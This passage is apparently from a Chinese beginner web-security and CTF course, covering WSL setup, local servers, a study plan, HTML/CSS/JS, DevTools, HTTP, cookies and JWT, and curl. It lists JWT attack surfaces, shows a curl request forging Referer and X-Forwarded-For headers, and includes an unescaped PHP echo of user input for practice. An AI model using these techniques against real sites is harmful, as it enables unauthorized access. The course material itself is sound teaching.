+<ol class="steps"><li>打开 Ubuntu，先更新软件源：<code>sudo apt update</code>（第一次要输 Windows 的密码，输密码时屏幕不显示，正常）。</li><li>装基础工具：<code>sudo apt install -y python3 python3-pip php nginx curl git</code>。</li><li>验证装好：<code>python3 -V</code>、<code>php -v</code>、<code>nginx -v</code>，各出一行版本号就成功。</li><li>建一个练手目录：<code>mkdir -p ~/ctf && cd ~/ctf</code>。</li><li>把 Windows 上的文件用 <code>/mnt/c/...</code> 访问，或把文件复制进来：<code>cp /mnt/c/Users/WEIHAO/Desktop/wei_web/dist/wei_web.html .</code>。</li><li>（可选）想换源加速：编辑 <code>/etc/apt/sources.list</code>，把 archive.ubuntu.com 换成 mirrors.tuna.tsinghua.edu.cn，再 <code>sudo apt update</code>。</li></ol>
+<div class="code"><div class="cbar">常用环境检查一次性跑完 · bash</div><pre><code>sudo apt update
+sudo apt install -y python3 python3-pip php nginx curl git unzip
+
+python3 -V        # Python 3.x
+php -v            # PHP 8.x
+nginx -v          # nginx/1.x
+curl --version    # curl 8.x
+
+mkdir -p ~/ctf &amp;&amp; cd ~/ctf &amp;&amp; pwd</code></pre></div>
+<div class="tablewrap"><div class="tcap">WSL 的四个实用知识</div><table><thead><tr><th>问题</th><th>答案</th></tr></thead><tbody><tr><td>Windows 的文件在哪？</td><td>/mnt/c/Users/WEIHAO/...（C 盘对应 /mnt/c）</td></tr><tr><td>Ubuntu 的文件 Windows 能打开吗？</td><td>能：资源管理器地址栏输入 \\wsl$\Ubuntu\home\weihao</td></tr><tr><td>为什么 apt 要 sudo？</td><td>装软件要写系统目录，普通用户没权限</td></tr><tr><td>sudo 密码输不进去？</td><td>Linux 输入密码时不显示任何字符，盲输完回车即可</td></tr></tbody></table></div>
+<blockquote class="note">💡 装 Kali 的事先不急：<b>Ubuntu 已经足够跑通本课程 90% 的内容</b>。等你把这一模块的 Ubuntu 用熟了，再考虑装 Kali（或者直接装个 Docker 跑 Kali 镜像）。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://learn.microsoft.com/zh-cn/windows/wsl/" target="_blank" rel="noopener">WSL 官方文档（中文）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>sudo apt install 里的 sudo 是干什么的？</li><li>WSL 里怎么访问 C 盘的文件？</li><li>怎么确认 python3 / php / nginx 装好了？</li><li>为什么现在不建议马上装 Kali？</li></ol>
+</article>
+<article id="l-p0b5">
+<h2>跑起你的第一个本地 Web 服务</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>用三条命令分别起一个静态站、一个 PHP 站、一个 Flask 站，并知道端口是什么。</p></div>
+<p>本地起服务是你以后每天都要做的事：靶场在本地跑、自己的漏洞代码在本地跑、调试在本地跑。不用装复杂的东西，三条命令足够。</p>
+<div class="code"><div class="cbar">① 静态文件服务（最简单，任意目录可用） · bash</div><pre><code># 在任意目录里执行，就把这个目录当成网站根目录
+python3 -m http.server 8000
+
+# 然后浏览器打开 http://127.0.0.1:8000
+# 本课程的单文件版就是这样预览：
+cd /mnt/c/Users/WEIHAO/Desktop/wei_web/dist &amp;&amp; python3 -m http.server 8899
+# 打开 http://127.0.0.1:8899/wei_web.html</code></pre></div>
+<div class="code"><div class="cbar">② PHP 内置服务（练 PHP 特性时用） · bash</div><pre><code>cd ~/ctf
+echo '&lt;?php echo "hello " . $_GET["name"]; ?&gt;' &gt; index.php
+php -S 127.0.0.1:8001
+
+# 浏览器打开 http://127.0.0.1:8001/?name=web</code></pre></div>
+<div class="code"><div class="cbar">③ Flask（PART 5 会详细学） · python</div><pre><code># pip install flask
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    name = request.args.get("name", "web")
+    return f"&lt;h1&gt;Hello, {name}&lt;/h1&gt;"
+
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=8002)</code></pre></div>
+<div class="tablewrap"><div class="tcap">端口与访问地址</div><table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td>127.0.0.1</td><td>本机地址（localhost 和它等价）</td></tr><tr><td>端口 8000/8001/8002</td><td>同一台机器上区分不同服务；一个端口只能被一个程序占用</td></tr><tr><td>http://127.0.0.1:8000</td><td>完整访问地址：协议 + 地址 + 端口</td></tr><tr><td>服务没起来？</td><td>看终端报错；换一个端口；确认端口没被占用（ss -tlnp）</td></tr></tbody></table></div>
+<blockquote class="note">💡 一个小习惯：<b>每起一个服务就在终端占一个窗口，别关掉</b>；要停就 Ctrl+C。把这些启动命令记进 p0b3 的笔记里，以后直接复制。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview" target="_blank" rel="noopener">MDN · HTTP 概述（中文）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>python3 -m http.server 8000 做了一件什么事？</li><li>127.0.0.1 和 localhost 是什么关系？</li><li>端口被占用了怎么排查？</li><li>怎么停掉一个前台运行的本地服务？</li></ol>
+</article>
+<article id="l-p0b6">
+<h2>2–3 小时/周怎么学：22 周计划（82 节全学）</h2>
+<div class="meta">约 20 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>按每周 2–3 小时的节奏排出可执行的计划：22 周走完 82 节，工具与刷题从第 3 周就开始。</p></div>
+<p>先说结论：<b>每周 2–3 小时，22 周能把 82 节全部走完一遍</b>。关键不是「学完再练」，而是<b>学到工具那部分就开始打题</b>，边打边补语言。</p>
+<div class="tablewrap"><div class="tcap">22 周计划（按 2.5 小时/周）</div><table><thead><tr><th>周次</th><th>学什么</th><th>节数</th><th>这一阶段的验收</th></tr></thead><tbody><tr><td>第 1 周</td><td>PART 0 + 0.5：开课准备、命令行、WSL、起服务</td><td>10 节</td><td>能在 Ubuntu 里起服务、跑 20 个命令</td></tr><tr><td>第 1–2 周</td><td>PART 1：HTML/CSS/JS/控制台/读源码</td><td>6 节</td><td>能在控制台改页面、拿到第一个 flag</td></tr><tr><td>第 2–3 周</td><td>PART 2 + 2.5：HTTP、Cookie、curl、六段旅程</td><td>10 节</td><td>能手工发请求、把漏洞放回六段图</td></tr><tr><td>第 3–4 周</td><td>PART 3：Burp、靶场、信息收集、查手册（开始打题）</td><td>5 节</td><td>能改包、能独立打掉几道新手题</td></tr><tr><td>第 4–7 周</td><td>PART 4：JS / Python / PHP（Python 在 PHP 前）</td><td>8 节</td><td>能写 20 行脚本复现一次手工测试</td></tr><tr><td>第 7–9 周</td><td>PART 5：自己写一个 Web 应用（Flask 小站）</td><td>5 节</td><td>能跑起自己的站，并用 Burp 打它</td></tr><tr><td>第 9–10 周</td><td>PART 6：技术栈识别（快速过）</td><td>5 节</td><td>看到站能猜出后端与框架</td></tr><tr><td>第 10–15 周</td><td>PART 7：漏洞体系 9 节 + 靶场</td><td>9 节</td><td>每类漏洞能独立复现</td></tr><tr><td>第 15–18 周</td><td>PART 8：高级漏洞 9 节</td><td>9 节</td><td>能读源码找链，不靠背 payload</td></tr><tr><td>第 18–20 周</td><td>PART 9：渗透流程（收集/验证/后渗透/报告）+ 解题方法论</td><td>11 节</td><td>能写出一份合格的验证记录与报告</td></tr><tr><td>第 20–22 周</td><td>PART 10：实战复盘</td><td>4 节</td><td>能独立完成一遍完整流程并复盘</td></tr></tbody></table></div>
+<h3>「2 小时」怎么切</h3>
+<ul><li><b>20 分钟</b>：读一节正文（不敲代码，先建立印象）。</li><li><b>60 分钟</b>：跟着动手——起服务、敲命令、在控制台试。这一块不能省。</li><li><b>20 分钟</b>：做本节自测 + 写笔记（写「我今天学会了什么」，3 行就够）。</li><li><b>20 分钟</b>：把命令和 payload 抄进自己的速查表（用笔记框）。</li></ul>
+<h3>什么时候可以加速、什么时候该停</h3>
+<ul><li>基础部分（PART 0–4）不要反复回炉：过一遍就往前走，后面用到了自然会补。</li><li>PART 6 框架只花 2 周快速过：认得出技术栈就够了，框架细节遇到题目再查。</li><li>某一节连续两次都卡住超过 40 分钟：记下「卡在哪」，先走下一节，别停在一节上。</li><li>漏洞部分（PART 7 / 8）反过来要慢：每节必须在靶场上动手一次，不能只读。</li></ul>
+<blockquote class="note">💡 最重要的不是速度，是<b>每周真的打开一次</b>。建议把「周三晚 20:00 学 1 小时 + 周六上午 1.5 小时」写进日历，比任何学习方法都有效。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>22 周计划里，基础（PART 0–4）占了前几周？为什么要压缩它？</li><li>「2 小时」的四个 20 分钟分别做什么？</li><li>某节连续两次卡住超过 40 分钟时该怎么处理？</li><li>为什么漏洞部分（PART 7）反而要慢下来、每节都动手？</li></ol>
+</article></section>
+<section class="mod" id="m-p1"><h1>PART 1 · Web 地基</h1><div class="sub">第 1–2 周 · 6 节</div><blockquote class="note">浏览器里的一切：HTML 结构、CSS 隐藏、JS 行为、控制台、开发者工具、读源码。这一层不学，后面全是背 payload。</blockquote><article id="l-p1l1">
+<h2>HTML：网页的骨架</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>看懂任意网页的 HTML 结构，分清「给人看的」和「给浏览器看的」。</p></div>
+<p>HTML 用「标签」描述页面有什么内容。浏览器读到标签，才知道哪里是标题、哪里是图片、哪里是链接。</p>
+<div class="code"><div class="cbar">最小网页结构 · html</div><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;title&gt;我的第一个网页&lt;/title&gt;
+    &lt;link rel="stylesheet" href="style.css"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;你好，Web&lt;/h1&gt;
+    &lt;p&gt;这是一段文字。&lt;/p&gt;
+    &lt;a href="https://example.com"&gt;一个链接&lt;/a&gt;
+    &lt;img src="cat.png" alt="一只猫"&gt;
+    &lt;!-- 注释：浏览器不会显示这一行 --&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+<ul><li><b>&lt;head&gt;</b>：给浏览器看的信息。标题、字符集、外部样式、脚本、meta 信息。不直接显示在页面上。</li><li><b>&lt;body&gt;</b>：给人看的内容。</li><li>常见标签：<b>h1-h6</b> 标题、<b>p</b> 段落、<b>a</b> 链接、<b>img</b> 图片、<b>div</b> 区块、<b>form/input</b> 表单。</li><li><b>属性</b>：name="value" 给标签补充信息，例如 href、src、class、id、type。</li><li><b>&lt;!-- --&gt;</b>：注释。页面上看不到，但源码里完整存在。</li></ul>
+<blockquote class="note">💡 CTF 里大量「藏在页面里」的 flag，就藏在注释、隐藏表单字段、display:none 的元素、或者 data-* 自定义属性里。记住：能发到浏览器的，就不算秘密。</blockquote>
+<p>动手：在桌面新建 hello.html，粘进上面的代码，双击用浏览器打开，然后按 F12 看 Elements 面板。</p>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>&lt;head&gt; 和 &lt;body&gt; 的内容，哪个会显示在页面上？</li><li>注释在页面上能看到吗？在哪里能看到？</li><li>写出一个带链接的段落和一个带 id 的 div。</li></ol>
+</article>
+<article id="l-p1l2">
+<h2>CSS：样式，以及「被藏起来的东西」</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>知道 CSS 能隐藏内容，并能在 Elements 面板里把隐藏的东西「扒出来」。</p></div>
+<p>CSS 决定页面长什么样。选择器选中元素，声明块决定属性。</p>
+<div class="code"><div class="cbar">三种常见的「隐藏」 · css</div><pre><code>/* 1. 完全不占位，元素还在 DOM 里 */
+.hidden { display: none; }
+
+/* 2. 占位但看不见 */
+.invisible { visibility: hidden; }
+
+/* 3. 透明 / 移出屏幕外 —— 内容仍然可选中、可读 */
+.ghost {
+  opacity: 0;
+  position: absolute;
+  left: -9999px;
+}</code></pre></div>
+<p>这三种方式都只是「视觉隐藏」。DOM 里内容原样存在，F12 一看就露。</p>
+<p>实操：在 Elements 面板选中元素，右侧 Styles 里把 <b>display: none</b> 取消勾选，元素立刻出现。这是 CTF 里最基本的一招。</p>
+<div class="code"><div class="cbar">练习用页面 · html</div><pre><code>&lt;div style="display:none"&gt;你找到我了&lt;/div&gt;
+&lt;div style="opacity:0"&gt;我也在&lt;/div&gt;
+&lt;input type="hidden" name="token" value="secret-token"&gt;</code></pre></div>
+<blockquote class="note">💡 注意最后那个 &lt;input type="hidden"&gt;：它不是 CSS 隐藏，而是表单字段本身就不显示。它的 value 会随表单一起提交——这是「前端泄露」的经典位置。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>display:none 和 visibility:hidden 的区别是什么？</li><li>元素被 display:none 之后，内容还在 DOM 里吗？</li><li>type="hidden" 的 input 有什么安全风险？</li></ol>
+</article>
+<article id="l-p1l3">
+<h2>JavaScript：从看懂到能改页面</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>读懂基本 JS 代码，并能在控制台里改页面内容、发一个请求。</p></div>
+<p>JavaScript 让页面「动起来」：响应点击、发请求、改内容。它是 Web 方向第一门必须掌握的语言。</p>
+<div class="code"><div class="cbar">最小语法集 · js</div><pre><code>// 变量
+var a = 1;            // 老写法，函数作用域
+let b = "text";       // 块级作用域
+const c = true;       // 常量，不可重新赋值
+
+// 对象与数组
+const user = { name: "wei", age: 18, tags: ["web", "ctf"] };
+console.log(user.name);      // wei
+console.log(user.tags[0]);   // web
+
+// 函数
+function add(x, y) { return x + y; }
+const mul = (x, y) =&gt; x * y;  // 箭头函数，等价写法
+
+// 条件与循环
+if (user.age &gt;= 18) { console.log("adult"); }
+for (const t of user.tags) { console.log(t); }</code></pre></div>
+<div class="code"><div class="cbar">操作页面（DOM） · js</div><pre><code>// 选中元素
+const box = document.getElementById("box");
+const first = document.querySelector("h1");
+const all = document.querySelectorAll("a");   // 类数组
+
+// 改内容与样式
+box.textContent = "被改了";
+box.style.background = "red";
+
+// 读属性
+console.log(box.getAttribute("data-x"));
+
+// 绑定事件
+box.onclick = () =&gt; alert("你点了我");</code></pre></div>
+<div class="code"><div class="cbar">发请求（fetch） · js</div><pre><code>fetch("/api/user?id=1")
+  .then(r =&gt; r.json())          // 把响应体当 JSON 解析
+  .then(data =&gt; console.log(data))
+  .catch(err =&gt; console.error(err));</code></pre></div>
+<blockquote class="note">💡 fetch 是异步的。代码写完之后不会立刻拿到结果，所以要用 .then 或 async/await。<b>在控制台里直接写返回值，会看到 Promise {&lt;pending&gt;} —— 这不是错，是还没回来。</b></blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide" target="_blank" rel="noopener">MDN · JavaScript 入门（中文）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>var / let / const 的区别？</li><li>document.querySelector 和 querySelectorAll 返回的东西有什么不同？</li><li>为什么控制台里 fetch 之后立刻打印是 Promise pending？</li></ol>
+</article>
+<article id="l-p1l4">
+<h2>在控制台写代码（Console 实战）</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能在 Console 面板里直接执行 JS：选元素、改页面、读变量、发请求。</p></div>
+<p>控制台（Console）是浏览器留给你的「任意代码执行入口」。它跑在当前页面的环境里，能用页面上所有变量和函数——这是 Web 安全和前端逆向最重要的工具之一。</p>
+<p>打开方式：F12 → Console 面板。快捷键 Ctrl+Shift+J 可直接跳过来。</p>
+<div class="code"><div class="cbar">第一步：选元素（$ 与 $$） · js</div><pre><code>$("h1")            // 等价 document.querySelector("h1")
+$$("a")            // 等价 querySelectorAll，返回数组
+$("h1").textContent = "控制台改的"</code></pre></div>
+<div class="code"><div class="cbar">第二步：读页面上的东西 · js</div><pre><code>document.title           // 标题
+document.cookie          // 本页可见的 Cookie
+document.forms[0]        // 第一个表单
+[...document.querySelectorAll("input")].map(i =&gt; i.value)  // 所有输入框的值</code></pre></div>
+<div class="code"><div class="cbar">第三步：发请求并看结果 · js</div><pre><code>// 同步写法：控制台支持 await（顶层 await）
+const r = await fetch("/api/user?id=1");
+const j = await r.json();
+console.log(j);</code></pre></div>
+<div class="code"><div class="cbar">第四步：几个提高效率的技巧 · js</div><pre><code>$_            // 上一次表达式的结果
+$0            // 在 Elements 里当前选中的元素
+console.table([{a:1,b:2},{a:3,b:4}])   // 表格化输出
+console.dir(obj)                       // 展开对象结构
+copy(obj)                              // 把对象复制到剪贴板
+monitorEvents(window, "click")         // 监控事件</code></pre></div>
+<p><b>动手练习（就在这个页面上做）：</b></p>
+<ul><li>按 F12 打开 Console，输入 <b>document.title</b>，看到当前标题。</li><li>输入 <b>document.title = "我改的"</b>，看浏览器标签页标题变化。</li><li>输入 <b>$("h1").textContent</b>，读出当前这节的标题。</li><li>输入 <b>document.cookie</b>，看这个页面有没有 Cookie。</li></ul>
+<blockquote class="note">💡 控制台里的修改只在当前页面有效，刷新就没了。这是它适合「试探」的原因——但也意味着你不能靠它改文件。</blockquote>
+<p>进阶：控制台是 CTF 里破解「前端校验」最直接的入口。如果一段逻辑写在 JS 里（比如密码比对、token 生成），你完全可以在控制台里调用它、改参数、绕过它。</p>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>在控制台里 $("h1") 等价于什么？</li><li>为什么说控制台能绕过前端校验？</li><li>console.table 和 console.log 有什么区别，什么时候更好用？</li><li>控制台里改的东西刷新后会保留吗？</li></ol>
+</article>
+<article id="l-p1l5">
+<h2>开发者工具五个核心面板</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>说清 Elements / Console / Sources / Network / Application 各查什么。</p></div>
+<p>F12 打开后，顶部一排标签就是你的主战场。CTF Web 题 80% 的信息都在这里。</p>
+<ul><li><b>Elements / 元素</b>：看并临时修改 HTML 与 CSS。找隐藏内容、找注释、改样式，都在这里。</li><li><b>Console / 控制台</b>：执行 JS、看报错、发请求。上一节专门讲过。</li><li><b>Sources / 源代码</b>：看页面加载的 JS 文件、打断点、单步调试。读 app.js 就在这里。</li><li><b>Network / 网络</b>：看每一次 HTTP 请求——URL、方法、请求头、请求体、响应。<b>这是 Web 安全最核心的面板。</b></li><li><b>Application / 应用</b>：看 Cookie、LocalStorage、SessionStorage、IndexedDB、缓存。</li></ul>
+<div class="code"><div class="cbar">Network 面板最该看的四样东西 · text</div><pre><code>1. Request URL      —— 请求打到了哪个接口
+2. Request Method   —— GET 还是 POST
+3. Request Headers  —— Cookie / Authorization / Referer / User-Agent
+4. Payload / Form Data —— 到底提交了什么参数
+
+进阶：右键请求 → Copy as cURL，可以直接拿到命令行复现命令</code></pre></div>
+<p>实操：打开任意网站 → F12 → Network → 刷新页面 → 点开第一个请求 → 找到「请求标头」和「响应标头」。</p>
+<blockquote class="note">💡 Network 面板默认会「清空」历史请求。勾上 Preserve log（保留日志），页面跳转时请求记录才不会丢——登录流程、重定向类题目必须开这个。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>想知道登录时提交了什么，看哪个面板的哪一部分？</li><li>Cookie 在哪个面板查看和编辑？</li><li>为什么做登录/重定向题要先勾「保留日志」？</li><li>「Copy as cURL」有什么用？</li></ol>
+</article>
+<article id="l-p1l6">
+<h2>读源代码：从 F12 到读懂 app.js</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能在 Sources 面板里定位并读懂一个 JS 文件，从中找出关键变量或 flag。</p></div>
+<p>前面都是「看页面」。这一节是「看代码」。Web 题里真正值钱的信息，往往在被压缩过、看不下去的 JS 文件里。</p>
+<p><b>第一步：找到文件。</b>F12 → Sources 面板 → 左侧 Page 折叠出站点域名 → 展开可以看到所有加载的 js / css / 图片。</p>
+<p><b>第二步：全局搜索。</b>按 Ctrl+Shift+F（不是 Ctrl+F），可以在<b>所有文件</b>里搜索字符串。找 flag、找 api、找 password、找 key，这是最快的一招。</p>
+<p><b>第三步：美化压缩代码。</b>压缩过的代码是一整行。点 Sources 面板左下角的 <b>{ }</b> 按钮（Pretty print），它会自动换行缩进。</p>
+<div class="code"><div class="cbar">压缩代码长什么样，为什么要看懂它 · js</div><pre><code>// 压缩后的样子（一行到底，变量名全被改成 _0x 开头）
+!function(){var _0x3f8a=["r3ad_th3_s0urc3"],_0x1a2b="flag{";
+window.__demo={version:"1.0",key:function(){return _0x1a2b+_0x3f8a[0]+"}"}};}();
+
+// 美化 + 加换行后，逻辑就出来了：
+// 1) 定义字符串数组 _0x3f8a
+// 2) 定义前缀 _0x1a2b = "flag{"
+// 3) 挂一个全局对象 window.__demo，其中 key() 返回 前缀 + 数组第 0 项 + "}"</code></pre></div>
+<p>压缩代码的三个阅读要诀：</p>
+<ul><li><b>先找字符串数组</b>：压缩工具通常把所有字符串集中到一个数组里（如 _0x3f8a），再通过下标取用。</li><li><b>再找全局挂载</b>：window.xxx、globalThis.xxx —— 这些是外部能访问到的出口，也是题目留给你的突破口。</li><li><b>最后看关键函数</b>：加密、校验、生成 token 的函数，就是你要绕过的对象。</li></ul>
+<p><b>第四步（核心技巧）：直接执行它。</b>如果能读到代码，就不一定要读懂——很多情况下你可以在控制台里直接调用那个函数拿到结果。</p>
+<div class="code"><div class="cbar">读不懂就调用 · js</div><pre><code>// 上面那段代码挂了 window.__demo，于是在控制台里：
+__demo.key()          // 直接把结果算出来
+// 输出：flag{r3ad_th3_s0urc3}</code></pre></div>
+<blockquote class="note">💡 这是 Web 安全里极其重要的思维：<b>只要代码在客户端，它就是可读、可改、可调用的。</b>「前端加密」在有代码的情况下等于没有加密。</blockquote>
+<p><b>实战挑战：</b>这个页面里就埋了一段压缩脚本（不叫 app.js，但同理）。请你自己找出 flag：</p>
+<ul><li>方式一（读代码）：F12 → Sources → 找到本页的 HTML 或内联脚本 → 找 <b>__weiweb_bundle</b> 相关的代码，读出拼接逻辑。</li><li>方式二（搜索）：Ctrl+Shift+F 搜 <b>r3ad_th3_s0urc3</b>，看它在哪个文件、被谁拼起来。</li><li>方式三（执行）：在 Console 里直接调 <b>__weiweb_bundle.key()</b>。</li></ul>
+<p>三条路都能拿到同一个 flag。拿到后填到下面：</p>
+<blockquote class="note">🚩 本节含提交型 flag 挑战，请在交互版（dist/wei_web.html）里作答。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://developer.chrome.com/docs/devtools/sources" target="_blank" rel="noopener">Chrome DevTools 官方文档 · Sources</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>Ctrl+Shift+F 和 Ctrl+F 的区别是什么？</li><li>压缩代码为什么要把字符串集中放到数组里？</li><li>「前端加密等于没有加密」这句话怎么理解？</li><li>如果一段 JS 逻辑你看不懂，还有什么绕过办法？</li></ol>
+</article></section>
+<section class="mod" id="m-p2"><h1>PART 2 · HTTP 与状态</h1><div class="sub">第 2–3 周 · 5 节</div><blockquote class="note">浏览器和服务器之间到底说了什么。Cookie 为什么能维持登录，又为什么会成为攻击面。</blockquote><article id="l-p2l1">
+<h2>HTTP 请求与响应结构</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能逐行拆解一个原始 HTTP 请求和响应。</p></div>
+<p>HTTP 是「一问一答」的文本协议。读懂它，是后面所有漏洞的前提。</p>
+<div class="code"><div class="cbar">请求的四部分 · http</div><pre><code>POST /login HTTP/1.1          ← 请求行：方法 + 路径 + 版本
+Host: example.com             ← 请求头开始
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+Cookie: session=abc123
+Content-Length: 27
+                              ← 空行（必须）
+{"user":"admin","pw":"123"}   ← 请求体</code></pre></div>
+<div class="code"><div class="cbar">响应的四部分 · http</div><pre><code>HTTP/1.1 200 OK               ← 状态行
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=abc123; HttpOnly
+Content-Length: 26
+                              ← 空行
+&lt;h1&gt;Hello, Web!&lt;/h1&gt;          ← 响应体</code></pre></div>
+<ul><li><b>请求行</b>：方法、路径（含查询串 ?a=1&b=2）、协议版本。</li><li><b>请求头</b>：Host、Cookie、User-Agent、Referer、Content-Type 等。</li><li><b>请求体</b>：GET 一般没有；POST/PUT 携带数据。</li><li><b>响应头</b>：Content-Type、Set-Cookie、Location（重定向）、Server。</li></ul>
+<blockquote class="note">💡 CTF 里「改请求」改的通常是这几处：路径参数、请求头（Cookie/Referer/X-Forwarded-For/User-Agent）、请求体。90% 的 Web 题都是在这三个位置做文章。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>请求行包含哪三部分？</li><li>GET 请求可以有请求体吗？（技术上与约定上要分开想）</li><li>Set-Cookie 出现在请求还是响应里？</li></ol>
+</article>
+<article id="l-p2l2">
+<h2>请求方法与状态码</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能根据方法和状态码判断发生了什么，并知道哪些状态码在 CTF 里是「有戏」的信号。</p></div>
+<ul><li><b>GET</b> 取数据，参数在 URL；<b>POST</b> 提交数据，参数在请求体；<b>PUT</b> 更新；<b>DELETE</b> 删除；<b>HEAD</b> 只要响应头；<b>OPTIONS</b> 查支持的方法（CORS 预检会用到）。</li></ul>
+<ul><li><b>200</b> 成功｜<b>301/302</b> 重定向｜<b>304</b> 缓存未改</li><li><b>400</b> 请求格式错误｜<b>401</b> 未认证｜<b>403</b> 拒绝访问｜<b>404</b> 不存在｜<b>405</b> 方法不允许</li><li><b>500</b> 服务器内部错误｜<b>502/503/504</b> 网关/服务不可用</li></ul>
+<p>CTF 里的状态码信号：</p>
+<ul><li>本该 403 的页面返回 200 → 可能绕过了权限校验。</li><li>同样的请求，改一个参数后响应长度变了 → 存在注入或条件判断（盲注的核心）。</li><li>500 且报错里带 SQL 语法 → 注入点暴露。</li><li>302 跳到 /admin → 可能已经拿到管理员会话。</li></ul>
+<blockquote class="note">💡 别只看状态码。<b>响应长度、响应时间、响应内容差异</b>，往往比状态码更能说明问题。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>401 和 403 的本质区别是什么？</li><li>为什么盲注要盯「响应长度」或「响应时间」？</li><li>OPTIONS 请求在什么场景下会自动发出？</li></ol>
+</article>
+<article id="l-p2l3">
+<h2>Cookie、Session、Token</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>讲清「登录状态」的三代实现方式，以及各自的攻击面。</p></div>
+<p>HTTP 是无状态的：服务器默认不记得你上次来过。为了让「登录一次，之后都认识你」，诞生了三种方案。</p>
+<div class="code"><div class="cbar">① Cookie + Session（服务端存状态） · http</div><pre><code>响应：Set-Cookie: session=8f3a...; HttpOnly; Path=/
+请求：Cookie: session=8f3a...
+
+服务端：session 表里 8f3a -&gt; {uid: 1, role: "user"}
+特点：浏览器只拿到一个随机 ID，真实数据在服务器</code></pre></div>
+<div class="code"><div class="cbar">② JWT（信息存在 token 里） · js</div><pre><code>// JWT 由三段组成：header.payload.signature
+// payload 是 base64url，任何人都能解开看
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+.
+{ "uid": 1, "role": "user" }
+.
+&lt;用密钥算出的签名&gt;</code></pre></div>
+<p>JWT 的关键认知：<b>payload 是明文可读的（只是 base64），安全性完全依赖签名。</b>所以攻击面很明确——篡改 payload 后能否让签名校验通过。</p>
+<ul><li><b>Cookie 相关攻击面</b>：session id 可预测、未设 HttpOnly 被 XSS 偷走、SameSite 缺失导致 CSRF。</li><li><b>JWT 相关攻击面</b>：alg 改成 none、弱密钥可爆破、公钥当私钥用（算法混淆）、kid 注入。</li><li><b>前端存储 token 的风险</b>：放 localStorage 会被 XSS 读走。</li></ul>
+<p>实操：F12 → Application → Cookies / LocalStorage，看这个站存了什么。</p>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>Cookie 和 Session 分别存在哪一侧？</li><li>JWT 的 payload 能被别人看到吗？为什么？</li><li>为什么把 token 放 localStorage 有风险？</li></ol>
+</article>
+<article id="l-p2l4">
+<h2>用 curl 手动发请求</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>脱离浏览器，用命令行精确控制每一个请求头。</p></div>
+<p>浏览器会「帮你补全」很多头，这反而让你看不清到底发了什么。curl 让你完全掌控。</p>
+<div class="code"><div class="cbar">常用姿势 · bash</div><pre><code># 最基础
+curl https://example.com/
+
+# 只看响应头
+curl -I https://example.com/
+
+# 跟随重定向，并显示过程
+curl -L -v https://example.com/
+
+# 发 POST 表单
+curl -X POST -d "username=admin&amp;password=123" https://example.com/login
+
+# 发 JSON
+curl -X POST -H "Content-Type: application/json" \
+     -d '{"user":"admin"}' https://example.com/api
+
+# 带上 Cookie
+curl -b "session=abc123" https://example.com/profile
+
+# 自定义任意头（伪造 Referer / XFF）
+curl -H "Referer: https://admin.example.com" \
+     -H "X-Forwarded-For: 127.0.0.1" https://example.com/</code></pre></div>
+<blockquote class="note">💡 浏览器 Network 面板里右键请求 → <b>Copy as cURL</b>，可以直接得到等价命令。这是从「浏览器操作」过渡到「脚本操作」最省力的桥。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>-I 和 -i 有什么区别？</li><li>-b 和 -H "Cookie: ..." 是等效的吗？</li><li>为什么要伪造 X-Forwarded-For？</li></ol>
+</article>
+<article id="l-p2l5">
+<h2>第一个 flag（动手）</h2>
+<div class="meta">约 20 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>用开发者工具在本页里找到隐藏 flag。</p></div>
+<p>你已经知道「页面显示的 ≠ 页面的全部」。现在在<b>这个课程中心</b>里找 flag。</p>
+<p>提示 1：F12。</p>
+<p>提示 2：Elements 面板里的 &lt;head&gt;。</p>
